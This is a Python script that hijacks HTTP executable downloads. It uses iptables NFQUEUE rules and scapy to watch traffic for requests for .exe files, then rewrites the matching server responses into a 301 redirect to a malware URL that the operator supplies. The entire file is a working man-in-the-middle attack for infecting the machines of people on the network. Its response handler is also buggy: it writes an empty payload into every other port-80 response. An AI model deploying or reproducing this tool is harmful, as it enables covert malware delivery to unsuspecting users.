from netfilterqueue import *
from subprocess import *
import scapy.all as scapy

ack_list = []
global malware
def http_request(packets):
    # CHECK FOR EXE FILES
    if ".exe".encode() in packets[scapy.Raw].load:
        print("[+].exe FOUND....")
        # APPEND ACK NUMBER TO ACK LIST
        ack_list.append(packets[scapy.TCP].ack)

def http_responce(packets):
    # CHECK IF SEQ NUMBER IS IN ACK LIST
    if packets[scapy.TCP].seq in ack_list:
        # REMOVE SEQ NUMBER FROM ACK LIST
        ack_list.remove(packets[scapy.TCP].seq)
        print("[+]REPLACING FILE")
        new_load = "HTTP/1.1 301 Moved Permanently\nLocation: " + malware + "\n\n"
        return new_load

def set_load(packets, load):
    # REPLACE THE DOWNLOAD FILE WITH OUR FILE
    packets[scapy.Raw].load = load

    del packets[scapy.IP].len
    del packets[scapy.IP].chksum
    del packets[scapy.TCP].chksum
    return packets

def process_packets(packets):
    scapy_packets = scapy.IP(packets.get_payload())
    #CHECK FOR RAW LAYER IN PACKETS
    if scapy_packets.haslayer(scapy.Raw):
        # CHECK FOR TCP LAYER IN PACKETS
       if scapy_packets.haslayer(scapy.TCP):
           #CHECK FOR OUTGOING HTTP REQUEST
            if scapy_packets[scapy.TCP].dport == 80:
                http_request(scapy_packets)
            #CHECK FOR INCOMMING HTTP REQUEST
            elif scapy_packets[scapy.TCP].sport == 80:
                new_load = http_responce(scapy_packets)
                new_packets = set_load(scapy_packets,new_load)
                packets.set_payload(bytes(new_packets))

    packets.accept()

queue_num = input("ENTER THE QUEUE NUMBER > ")
call(["iptables","-I","OUTPUT","-j","NFQUEUE","--queue-num",str(queue_num)])
call(["iptables","-I","INPUT","-j","NFQUEUE","--queue-num",str(queue_num)])


malware = input("ENTER THE MALWARE URL > ")

queue = NetfilterQueue()
queue.bind(int(queue_num),process_packets)
try:
    queue.run()
except:
    call(["iptables","--flush"])
